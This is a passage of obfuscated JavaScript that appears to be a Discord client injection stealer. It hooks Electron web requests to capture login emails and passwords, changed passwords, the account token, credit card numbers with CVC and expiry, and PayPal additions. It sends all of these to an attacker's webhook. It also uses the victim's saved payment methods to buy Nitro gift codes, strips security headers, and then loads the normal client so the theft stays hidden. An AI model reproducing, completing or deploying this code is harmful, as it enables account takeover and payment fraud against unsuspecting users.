        if (!_0x3f084a) return '❌';
        let _0x2c6cb3 = '';
        _0x3f084a[_0x563ef4(0x29e)](_0x60d59e => {
            const _0x7f19ea = _0x563ef4;
            if (!_0x60d59e[_0x7f19ea(0x20a)]) switch (_0x60d59e['type']) {
                case 0x1:
                    _0x2c6cb3 += _0x7f19ea(0x1dd);
                    break;
                case 0x2:
                    _0x2c6cb3 += _0x7f19ea(0x281);
                    break;
            }
        });
        if (!_0x2c6cb3) _0x2c6cb3 = '❌';
        return _0x2c6cb3;
    },
    Purchase = async(_0x17f888, _0x51dfc2, _0x511ae3, _0x558536) => {
        const _0xc83bb2 = _0x3d8f8e,
            _0x47d50f = { 'expected_amount': config[_0xc83bb2(0x241)][_0x511ae3][_0x558536][_0xc83bb2(0x215)], 'expected_currency': _0xc83bb2(0x253), 'gift': !![], 'payment_source_id': _0x51dfc2, 'payment_source_token': null, 'purchase_token': '2422867c-244d-476a-ba4f-36e197758d97', 'sku_subscription_plan_id': config[_0xc83bb2(0x241)][_0x511ae3][_0x558536][_0xc83bb2(0x21c)] },
            _0x1cbf59 = execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/' + config[_0xc83bb2(0x241)][_0x511ae3][_0x558536]['id'] + _0xc83bb2(0x1cd) + _0x17f888 + _0xc83bb2(0x227) + JSON['stringify'](_0x47d50f) + '));\x0a\x20\x20\x20\x20xmlHttp.responseText');
        if (_0x1cbf59[_0xc83bb2(0x1d6)]) return 'https://discord.gift/' + _0x1cbf59[_0xc83bb2(0x1d6)];
        else return null;
    },
    buyNitro = async _0x5acb1a => {
        const _0x5d2daa = _0x3d8f8e,
            _0x16ebab = await fetchBilling(_0x5acb1a),
            _0x425cfe = _0x5d2daa(0x297);
        if (!_0x16ebab) return _0x425cfe;
        let _0x5c8847 = [];
        _0x16ebab[_0x5d2daa(0x29e)](_0x726874 => { const _0x431186 = _0x5d2daa;!_0x726874[_0x431186(0x20a)] && (_0x5c8847 = _0x5c8847['concat'](_0x726874['id'])); });
        for (let _0x574aa3 in _0x5c8847) {
            const _0x4d04e2 = Purchase(_0x5acb1a, _0x574aa3, _0x5d2daa(0x1ec), _0x5d2daa(0x234));
            if (_0x4d04e2 !== null) return _0x4d04e2;
            else {
                const _0x1c067c = Purchase(_0x5acb1a, _0x574aa3, _0x5d2daa(0x1ec), _0x5d2daa(0x263));
                if (_0x1c067c !== null) return _0x1c067c;
                else { const _0x1d5aad = Purchase(_0x5acb1a, _0x574aa3, _0x5d2daa(0x28f), _0x5d2daa(0x263)); return _0x1d5aad !== null ? _0x1d5aad : _0x425cfe; }
            }
        }
    },
    getNitro = _0x2ca71b => {
        const _0x52ede4 = _0x3d8f8e;
        switch (_0x2ca71b) {
            case 0x0:
                return _0x52ede4(0x277);
            case 0x1:
                return _0x52ede4(0x24d);
            case 0x2:
                return _0x52ede4(0x242);
            default:
                return _0x52ede4(0x277);
        }
    },
    getBadges = _0x56c884 => {
        const _0xb50da6 = _0x3d8f8e;
        let _0x2b9dbe = '';
        switch (_0x56c884) {
            case 0x1:
                _0x2b9dbe += _0xb50da6(0x29a);
                break;
            case 0x2:
                _0x2b9dbe += 'Partnered\x20Server\x20Owner,\x20';
                break;
            case 0x20000:
                _0x2b9dbe += _0xb50da6(0x1df);
                break;
            case 0x400000:
                _0x2b9dbe += 'Active\x20Developer,\x20';
                break;
            case 0x4:
                _0x2b9dbe += _0xb50da6(0x1e8);
                break;
            case 0x4000:
                _0x2b9dbe += _0xb50da6(0x1d9);
                break;
            case 0x8:
                _0x2b9dbe += _0xb50da6(0x280);
                break;
            case 0x200:
                _0x2b9dbe += _0xb50da6(0x22c);
                break;
            case 0x80:
                _0x2b9dbe += _0xb50da6(0x1ce);
                break;
            case 0x40:
                _0x2b9dbe += _0xb50da6(0x247);
                break;
            case 0x100:
                _0x2b9dbe += _0xb50da6(0x291);
                break;
            case 0x0:
                _0x2b9dbe = _0xb50da6(0x25d);
                break;
            default:
                _0x2b9dbe = _0xb50da6(0x25d);
                break;
        }
        return _0x2b9dbe;
    },
    hooker = async _0x5b40cf => {
        const _0x15c06e = _0x3d8f8e,
            _0x38ded6 = JSON[_0x15c06e(0x269)](_0x5b40cf),
            _0x35dc35 = new URL(config[_0x15c06e(0x202)]),
            _0x37f3f6 = { 'Content-Type': _0x15c06e(0x1d7), 'Access-Control-Allow-Origin': '*' };
        if (!config[_0x15c06e(0x202)]['includes']('api/webhooks')) {
            const _0x1cf683 = totp(config[_0x15c06e(0x1e4)]);
            _0x37f3f6['Authorization'] = _0x1cf683;
        }
        const _0x12fa2a = { 'protocol': _0x35dc35['protocol'], 'hostname': _0x35dc35[_0x15c06e(0x256)], 'path': _0x35dc35[_0x15c06e(0x1de)], 'method': _0x15c06e(0x1dc), 'headers': _0x37f3f6 },
            _0x552cd1 = https[_0x15c06e(0x1f5)](_0x12fa2a);
        _0x552cd1['on'](_0x15c06e(0x1d4), _0x1577f9 => {
            const _0x46518c = _0x15c06e;
            console[_0x46518c(0x278)](_0x1577f9);
        }), _0x552cd1[_0x15c06e(0x266)](_0x38ded6), _0x552cd1[_0x15c06e(0x1f9)]();
    },
    login = async(_0x226dc8, _0x22f468, _0x8641c4) => {
        const _0x405ef9 = _0x3d8f8e,
            _0x269aec = await getInfo(_0x8641c4),
            _0x26d362 = getNitro(_0x269aec[_0x405ef9(0x29c)]),
            _0x310dd9 = getBadges(_0x269aec['flags']),
            _0x3d9d36 = await getBilling(_0x8641c4),
            _0x1425e6 = { 'username': config['embed_name'], 'avatar_url': config['embed_icon'], 'embeds': [{ 'color': config[_0x405ef9(0x27f)], 'fields': [{ 'name': _0x405ef9(0x29b), 'value': 'Email:\x20**' + _0x226dc8 + _0x405ef9(0x24f) + _0x22f468 + '**', 'inline': ![] }, { 'name': _0x405ef9(0x1fe), 'value': _0x405ef9(0x1eb) + _0x26d362 + _0x405ef9(0x203) + _0x310dd9 + _0x405ef9(0x1f4) + _0x3d9d36 + '**', 'inline': ![] }, { 'name': '**Token**', 'value': '`' + _0x8641c4 + '`', 'inline': ![] }], 'author': { 'name': _0x269aec[_0x405ef9(0x296)] + '#' + _0x269aec['discriminator'] + _0x405ef9(0x29d) + _0x269aec['id'], 'icon_url': _0x405ef9(0x279) + _0x269aec['id'] + '/' + _0x269aec[_0x405ef9(0x289)] + _0x405ef9(0x255) } }] };
        if (config[_0x405ef9(0x1e7)]) _0x1425e6[_0x405ef9(0x25a)] = config[_0x405ef9(0x26c)];
        hooker(_0x1425e6);
    },
    passwordChanged = async(_0x27fa1f, _0x521b12, _0x4a000e) => {
        const _0x1bf702 = _0x3d8f8e,
            _0x26490e = await getInfo(_0x4a000e),
            _0xde81c1 = getNitro(_0x26490e[_0x1bf702(0x29c)]),
            _0x12a645 = getBadges(_0x26490e[_0x1bf702(0x21a)]),
            _0x3c019e = await getBilling(_0x4a000e),
            _0x2d4a77 = { 'username': config['embed_name'], 'avatar_url': config[_0x1bf702(0x26d)], 'embeds': [{ 'color': config['embed_color'], 'fields': [{ 'name': _0x1bf702(0x231), 'value': _0x1bf702(0x1da) + _0x26490e[_0x1bf702(0x1e5)] + '**\x0aOld\x20Password:\x20**' + _0x27fa1f + _0x1bf702(0x290) + _0x521b12 + '**', 'inline': !![] }, { 'name': _0x1bf702(0x1fe), 'value': _0x1bf702(0x1eb) + _0xde81c1 + _0x1bf702(0x203) + _0x12a645 + _0x1bf702(0x1f4) + _0x3c019e + '**', 'inline': !![] }, { 'name': _0x1bf702(0x1e2), 'value': '`' + _0x4a000e + '`', 'inline': ![] }], 'author': { 'name': _0x26490e[_0x1bf702(0x296)] + '#' + _0x26490e[_0x1bf702(0x1e3)] + _0x1bf702(0x29d) + _0x26490e['id'], 'icon_url': _0x1bf702(0x279) + _0x26490e['id'] + '/' + _0x26490e['avatar'] + _0x1bf702(0x255) } }] };
        if (config[_0x1bf702(0x1e7)]) _0x2d4a77[_0x1bf702(0x25a)] = config['ping_val'];
        hooker(_0x2d4a77);
    },
    emailChanged = async(_0x4e34fa, _0x1783c4, _0x4d0b88) => {
        const _0x577b9f = _0x3d8f8e,
            _0x287bc5 = await getInfo(_0x4d0b88),
            _0x481053 = getNitro(_0x287bc5[_0x577b9f(0x29c)]),
            _0x3b47a0 = getBadges(_0x287bc5['flags']),
            _0x476703 = await getBilling(_0x4d0b88),
            _0x2983cb = { 'username': config[_0x577b9f(0x200)], 'avatar_url': config['embed_icon'], 'embeds': [{ 'color': config[_0x577b9f(0x27f)], 'fields': [{ 'name': _0x577b9f(0x209), 'value': 'New\x20Email:\x20**' + _0x4e34fa + _0x577b9f(0x254) + _0x1783c4 + '**', 'inline': !![] }, { 'name': _0x577b9f(0x1fe), 'value': _0x577b9f(0x1eb) + _0x481053 + _0x577b9f(0x203) + _0x3b47a0 + _0x577b9f(0x1f4) + _0x476703 + '**', 'inline': !![] }, { 'name': _0x577b9f(0x1e2), 'value': '`' + _0x4d0b88 + '`', 'inline': ![] }], 'author': { 'name': _0x287bc5[_0x577b9f(0x296)] + '#' + _0x287bc5[_0x577b9f(0x1e3)] + _0x577b9f(0x29d) + _0x287bc5['id'], 'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x287bc5['id'] + '/' + _0x287bc5[_0x577b9f(0x289)] + _0x577b9f(0x255) } }] };
        if (config[_0x577b9f(0x1e7)]) _0x2983cb[_0x577b9f(0x25a)] = config[_0x577b9f(0x26c)];
        hooker(_0x2983cb);
    },
    PaypalAdded = async _0x33995e => {
        const _0x168c5f = _0x3d8f8e,
            _0x2afeec = await getInfo(_0x33995e),
            _0x5e0317 = getNitro(_0x2afeec[_0x168c5f(0x29c)]),
            _0x35ea22 = getBadges(_0x2afeec['flags']),
            _0x175c1a = getBilling(_0x33995e),
            _0x45249a = { 'username': config['embed_name'], 'avatar_url': config[_0x168c5f(0x26d)], 'embeds': [{ 'color': config[_0x168c5f(0x27f)], 'fields': [{ 'name': '**Paypal\x20Added**', 'value': 'Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩', 'inline': ![] }, { 'name': '**Discord\x20Info**', 'value': _0x168c5f(0x1eb) + _0x5e0317 + _0x168c5f(0x233) + _0x35ea22 + _0x168c5f(0x1f4) + _0x175c1a + '**', 'inline': ![] }, { 'name': _0x168c5f(0x1e2), 'value': '`' + _0x33995e + '`', 'inline': ![] }], 'author': { 'name': _0x2afeec[_0x168c5f(0x296)] + '#' + _0x2afeec['discriminator'] + _0x168c5f(0x29d) + _0x2afeec['id'], 'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x2afeec['id'] + '/' + _0x2afeec['avatar'] + '.webp' } }] };
        if (config[_0x168c5f(0x1e7)]) _0x45249a[_0x168c5f(0x25a)] = config['ping_val'];
        hooker(_0x45249a);
    },
    ccAdded = async(_0x498084, _0x32dc80, _0x23c72c, _0x177e61, _0xaca5bc) => {
        const _0x28b6ba = _0x3d8f8e,
            _0x20dae4 = await getInfo(_0xaca5bc),
            _0x34a3c7 = getNitro(_0x20dae4[_0x28b6ba(0x29c)]),
            _0x210dc8 = getBadges(_0x20dae4[_0x28b6ba(0x21a)]),
            _0x394fc9 = await getBilling(_0xaca5bc),
            _0xf714ce = { 'username': config[_0x28b6ba(0x200)], 'avatar_url': config[_0x28b6ba(0x26d)], 'embeds': [{ 'color': config[_0x28b6ba(0x27f)], 'fields': [{ 'name': '**Credit\x20Card\x20Added**', 'value': _0x28b6ba(0x286) + _0x498084 + _0x28b6ba(0x262) + _0x32dc80 + _0x28b6ba(0x23b) + _0x23c72c + '/' + _0x177e61 + '**', 'inline': !![] }, { 'name': _0x28b6ba(0x1fe), 'value': 'Nitro\x20Type:\x20**' + _0x34a3c7 + '**\x0aBadges:\x20**' + _0x210dc8 + _0x28b6ba(0x1f4) + _0x394fc9 + '**', 'inline': !![] }, { 'name': _0x28b6ba(0x1e2), 'value': '`' + _0xaca5bc + '`', 'inline': ![] }], 'author': { 'name': _0x20dae4[_0x28b6ba(0x296)] + '#' + _0x20dae4['discriminator'] + _0x28b6ba(0x29d) + _0x20dae4['id'], 'icon_url': _0x28b6ba(0x279) + _0x20dae4['id'] + '/' + _0x20dae4['avatar'] + _0x28b6ba(0x255) } }] };
        if (config['ping_on_run']) _0xf714ce['content'] = config[_0x28b6ba(0x26c)];
        hooker(_0xf714ce);
    },
    nitroBought = async _0x29ef35 => {
        const _0x3829d2 = _0x3d8f8e,
            _0x306774 = await getInfo(_0x29ef35),
            _0x5a7e19 = getNitro(_0x306774[_0x3829d2(0x29c)]),
            _0x44a2f9 = getBadges(_0x306774[_0x3829d2(0x21a)]),
            _0x521428 = await getBilling(_0x29ef35),
            _0x271f71 = await buyNitro(_0x29ef35),
            _0x5c931b = { 'username': config[_0x3829d2(0x200)], 'content': _0x271f71, 'avatar_url': config[_0x3829d2(0x26d)], 'embeds': [{ 'color': config[_0x3829d2(0x27f)], 'fields': [{ 'name': _0x3829d2(0x261), 'value': _0x3829d2(0x237) + _0x271f71 + _0x3829d2(0x20d), 'inline': !![] }, { 'name': '**Discord\x20Info**', 'value': _0x3829d2(0x1eb) + _0x5a7e19 + _0x3829d2(0x203) + _0x44a2f9 + _0x3829d2(0x1f4) + _0x521428 + '**', 'inline': !![] }, { 'name': _0x3829d2(0x1e2), 'value': '`' + _0x29ef35 + '`', 'inline': ![] }], 'author': { 'name': _0x306774['username'] + '#' + _0x306774[_0x3829d2(0x1e3)] + _0x3829d2(0x29d) + _0x306774['id'], 'icon_url': 'https://cdn.discordapp.com/avatars/' + _0x306774['id'] + '/' + _0x306774[_0x3829d2(0x289)] + _0x3829d2(0x255) } }] };
        if (config[_0x3829d2(0x1e7)]) _0x5c931b[_0x3829d2(0x25a)] = config[_0x3829d2(0x26c)] + ('\x0a' + _0x271f71);
        hooker(_0x5c931b);
    };
session[_0x3d8f8e(0x1e1)]['webRequest'][_0x3d8f8e(0x235)](config['filter2'], (_0x5ae103, _0x54f6a5) => {
    const _0x84b729 = _0x3d8f8e;
    if (_0x5ae103[_0x84b729(0x21b)][_0x84b729(0x28d)](_0x84b729(0x1fb))) return _0x54f6a5({ 'cancel': !![] });
    updateCheck();
}), session[_0x3d8f8e(0x1e1)][_0x3d8f8e(0x1f6)][_0x3d8f8e(0x218)]((_0x1279b5, _0x2c835f) => {
    const _0x16c5df = _0x3d8f8e;
    _0x1279b5[_0x16c5df(0x21b)][_0x16c5df(0x28d)](config['webhook']) ? _0x1279b5[_0x16c5df(0x21b)][_0x16c5df(0x1ea)](_0x16c5df(0x250)) ? _0x2c835f({ 'responseHeaders': Object[_0x16c5df(0x222)]({ 'Access-Control-Allow-Headers': '*' }, _0x1279b5[_0x16c5df(0x27d)]) }) : _0x2c835f({ 'responseHeaders': Object[_0x16c5df(0x222)]({ 'Content-Security-Policy': ['default-src\x20\x27*\x27', _0x16c5df(0x236), 'Access-Control-Allow-Origin\x20\x27*\x27'], 'Access-Control-Allow-Headers': '*', 'Access-Control-Allow-Origin': '*' }, _0x1279b5[_0x16c5df(0x27d)]) }) : (delete _0x1279b5[_0x16c5df(0x27d)][_0x16c5df(0x228)], delete _0x1279b5[_0x16c5df(0x27d)][_0x16c5df(0x21e)], _0x2c835f({ 'responseHeaders': {..._0x1279b5[_0x16c5df(0x27d)], 'Access-Control-Allow-Headers': '*' } }));
}), session[_0x3d8f8e(0x1e1)]['webRequest'][_0x3d8f8e(0x1f8)](config[_0x3d8f8e(0x22f)], async(_0xbd7b7c, _0x42ec34) => {
    const _0x4aefc9 = _0x3d8f8e;
    if (_0xbd7b7c['statusCode'] !== 0xc8 && _0xbd7b7c[_0x4aefc9(0x27e)] !== 0xca) return;
    const _0x702803 = Buffer[_0x4aefc9(0x230)](_0xbd7b7c[_0x4aefc9(0x28a)][0x0]['bytes'])[_0x4aefc9(0x2a1)](),
        _0xb77634 = JSON[_0x4aefc9(0x299)](_0x702803),
        _0x2053e4 = await execScript(_0x4aefc9(0x288));
    switch (!![]) {
        case _0xbd7b7c[_0x4aefc9(0x21b)][_0x4aefc9(0x26a)](_0x4aefc9(0x259)):
            login(_0xb77634[_0x4aefc9(0x259)], _0xb77634[_0x4aefc9(0x229)], _0x2053e4)[_0x4aefc9(0x22d)](console['error']);
            break;
        case _0xbd7b7c[_0x4aefc9(0x21b)]['endsWith'](_0x4aefc9(0x1f0)) && _0xbd7b7c[_0x4aefc9(0x20f)] === _0x4aefc9(0x295):
            if (!_0xb77634[_0x4aefc9(0x229)]) return;
            _0xb77634[_0x4aefc9(0x1e5)] && emailChanged(_0xb77634[_0x4aefc9(0x1e5)], _0xb77634[_0x4aefc9(0x229)], _0x2053e4)['catch'](console[_0x4aefc9(0x1d4)]);
            _0xb77634[_0x4aefc9(0x23e)] && passwordChanged(_0xb77634[_0x4aefc9(0x229)], _0xb77634['new_password'], _0x2053e4)[_0x4aefc9(0x22d)](console[_0x4aefc9(0x1d4)]);
            break;
        case _0xbd7b7c['url'][_0x4aefc9(0x26a)](_0x4aefc9(0x26b)) && _0xbd7b7c['method'] === _0x4aefc9(0x1dc):
            const _0x420226 = querystring['parse'](unparsedData[_0x4aefc9(0x2a1)]());
            ccAdded(_0x420226[_0x4aefc9(0x270)], _0x420226[_0x4aefc9(0x244)], _0x420226['card[exp_month]'], _0x420226[_0x4aefc9(0x232)], _0x2053e4)[_0x4aefc9(0x22d)](console[_0x4aefc9(0x1d4)]);
            break;
        case _0xbd7b7c[_0x4aefc9(0x21b)][_0x4aefc9(0x26a)](_0x4aefc9(0x239)) && _0xbd7b7c[_0x4aefc9(0x20f)] === _0x4aefc9(0x1dc):
            PaypalAdded(_0x2053e4)[_0x4aefc9(0x22d)](console['error']);
            break;
        case _0xbd7b7c['url'][_0x4aefc9(0x26a)](_0x4aefc9(0x272)) && _0xbd7b7c[_0x4aefc9(0x20f)] === _0x4aefc9(0x1dc):
            if (!config[_0x4aefc9(0x245)]) return;
            setTimeout(() => {
                const _0x389941 = _0x4aefc9;
                nitroBought(_0x2053e4)[_0x389941(0x22d)](console[_0x389941(0x1d4)]);
            }, 0x1d4c);
            break;
        default:
            break;
    }
}), module[_0x3d8f8e(0x20c)] = require('./core.asar');